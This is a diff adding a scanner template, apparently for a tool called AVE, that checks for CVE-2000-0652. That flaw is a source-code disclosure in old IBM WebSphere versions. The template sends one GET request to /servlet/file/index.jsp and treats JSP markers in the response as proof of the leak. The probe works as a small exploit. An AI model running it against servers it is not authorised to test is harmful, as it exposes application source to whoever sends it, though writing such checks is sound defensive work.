@@ -1,0 +1,41 @@
+[info]
+author = "ave"
+description = "检测 IBM WebSphere Application Server 2.0/3.0/3.0.2.1 源代码信息泄露漏洞。通过 InvokerServlet 直接调用 /servlet/file 路径读取可执行 Web 文件（如 JSP）的源代码，若响应中包含 JSP 脚本标记（如 <% 或 <%@ page）则可判定漏洞存在。"
+id = "POC-AVE-2000-0503"
+name = "IBM WebSphere Application Server 源代码泄露漏洞 PoC"
+severity = "medium"
+tags = ["cve-2000-0652"]
+vuln_id = [
+    "CVE-2000-0652",
+    "AVE-2000-0503",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/servlet/file/index.jsp"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<%@ page",
+    "<%@page",
+    "<%=",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
